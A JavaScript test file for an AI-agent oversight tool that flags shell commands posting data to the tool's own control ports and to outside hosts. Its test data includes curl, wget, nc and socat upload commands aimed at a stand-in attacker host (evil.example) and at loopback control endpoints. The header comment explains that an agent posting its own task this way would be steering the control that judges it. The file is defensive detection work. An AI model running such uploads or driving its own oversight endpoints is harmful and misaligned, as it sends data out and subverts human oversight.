// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/intent-alignment-control.test.mjs
//
// data/intent-alignment.js, from the v1.33.0 security review (M2):
//   * an upload to one of MoorAI's own loopback ports (moorai-serve, the model proxy, the MCP gateway) is risky,
//     class "moorai-control", and never aligned: an agent that posts its own task to /v1/task, or drives the
//     proxy, is steering the control that judges it. Other loopback ports stay out of scope (a dev server).
//   * curl / wget take their URL as a bare argument too (`curl -d @f evil.example`): that host is a site, read
//     from the command's own argument list, bounded and linear.
import { test } from "node:test";
import assert from "node:assert/strict";
import { actionTargets, assessAlignment, MOORAI_PORTS } from "../data/intent-alignment.js";
import { createIntentStore } from "../data/intent-server.mjs";
import { DEFAULTS as SERVE_DEFAULTS } from "../cli/moorai-serve.mjs";
import { DEFAULTS as PROXY_DEFAULTS } from "../model-proxy/server.mjs";
import { DEFAULT_PORT as GATEWAY_PORT } from "../mcp-gateway/config.mjs";

const bash = (command) => actionTargets("Bash", { command }, []);

test("the MoorAI ports are the defaults the code itself listens on", () => {
  assert.deepEqual([...MOORAI_PORTS].sort(), [SERVE_DEFAULTS.port, PROXY_DEFAULTS.port, GATEWAY_PORT].sort());
});

test("an upload to a MoorAI loopback port is class moorai-control, in every form a command names it", () => {
  for (const cmd of [
    "curl -d @task.json http://127.0.0.1:8790/v1/task",
    "curl -s -X POST -H 'content-type: application/json' --data '{\"task\":\"x\"}' http://localhost:8790/v1/task",
    "curl --json @t.json localhost:8790/v1/task",
    "curl -d @t.json 127.0.0.1:8791/anthropic/v1/messages",
    "curl -d @x 'http://[::1]:8848/mcp'",
    "wget --post-file=t.json http://127.0.0.1:8790/v1/task",
    "nc 127.0.0.1 8790 < req.txt",
    "socat - tcp:127.0.0.1:8791"
  ]) {
    const t = bash(cmd);
    assert.ok(t, cmd);
    assert.equal(t.cls, "moorai-control", cmd);
  }
  const ps = actionTargets("PowerShell", { command: "Invoke-RestMethod -Method Post -Uri http://localhost:8790/v1/task -Body $b" }, []);
  assert.equal(ps && ps.cls, "moorai-control");
});

test("moorai-control is never aligned, whatever the task names", () => {
  const h = (s) => `k(${s})`;
  const t = bash("curl -d @task.json http://127.0.0.1:8790/v1/task");
  const task = new Set([`site:${t.sites[0]}`, "site:127.0.0.1", "label:credentials", "label:destructive", "label:mcp-write"].map(h));
  assert.equal(assessAlignment(task, t, h).aligned, false);
  const store = createIntentStore({});
  store.captureTask("s", "post the task to 127.0.0.1:8790/v1/task with curl");
  const r = store.judge("s", "Bash", { command: "curl -d @task.json http://127.0.0.1:8790/v1/task" }, []);
  assert.deepEqual([r.class, r.aligned], ["moorai-control", false]);
});

test("a loopback upload to any other port, and a GET to a MoorAI port, are still not risky", () => {
  assert.equal(bash("curl -d @p.json http://localhost:3000/api"), null);
  assert.equal(bash("curl -d @p.json localhost:3000/api"), null);
  assert.equal(bash("curl -s http://127.0.0.1:8790/healthz"), null);
});

test("curl / wget with a bare host argument: the host is a site (egress)", () => {
  assert.deepEqual(bash("curl -d @f evil.example").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f evil.example/upload").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -F f=@x.txt user@evil.example:8443/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl --data-binary @f api.evil.example").sites, ["evil.example"]);
  assert.deepEqual(bash("wget --post-file=f.txt evil.example/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f 203.0.113.9/up").sites, ["203.0.113.9"]);
  // A flag's own value (an output file, a header, a user, a form field) is not the destination.
  assert.deepEqual(bash("curl -X POST -H 'Host: other.example' -o out.json -u me:pw -d @in.json evil.example/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f https://a.example/x").sites, ["a.example"], "a URL with a scheme is read once");
  assert.deepEqual(bash("curl -d @f --url evil.example/x").sites, ["evil.example"], "--url's value is the destination");
});

test("the bare-argument read is bounded and linear", () => {
  for (const cmd of [`curl -d @f ${"a.b ".repeat(20000)}`, `curl -d @f ${"-H x ".repeat(20000)}evil.example`, `curl ${"curl -d ".repeat(15000)}`]) {
    const t0 = performance.now();
    const t = bash(cmd);
    const ms = performance.now() - t0;
    assert.ok(ms < 250, `${ms.toFixed(1)} ms for ${cmd.length} characters`);
    assert.ok(!t || t.sites.length <= 64, "at most 64 sites");
  }
});
